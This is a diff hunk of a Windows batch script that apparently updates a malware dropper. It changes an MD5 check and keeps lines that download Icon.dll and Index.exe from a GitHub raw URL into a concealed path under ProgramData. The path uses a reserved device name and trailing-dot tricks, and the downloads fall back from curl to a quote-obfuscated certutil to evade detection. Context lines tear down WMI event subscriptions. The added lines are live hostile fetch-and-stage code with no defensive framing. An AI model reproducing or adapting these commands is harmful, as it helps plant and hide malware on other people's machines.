@@ -20,9 +20,9 @@ powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -
 powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='NOC'\" | Remove-WmiObject"
 powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='NOC'\" | Remove-WmiObject"
 
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "bb8ec1cad79a6b47ac6a6e472a407d20" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "bb8ec1cad79a6b47ac6a6e472a407d20" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Icon.dll" "\\.\%ProgramData%\prndata..\prn"
-powershell.exe -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne 'bb8ec1cad79a6b47ac6a6e472a407d20') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/Icon.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "9abdf6b545bba829787a485bfd6a073a" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "9abdf6b545bba829787a485bfd6a073a" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Icon.dll" "\\.\%ProgramData%\prndata..\prn"
+powershell.exe -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '9abdf6b545bba829787a485bfd6a073a') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/Icon.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
 
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || curl.exe -s -L -o "\\?\%ProgramData%\prndata..\prn.exe" "https://github.com/vltex/1/raw/1/0/Index.exe"
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Index.exe" "\\?\%ProgramData%\prndata..\prn.exe"
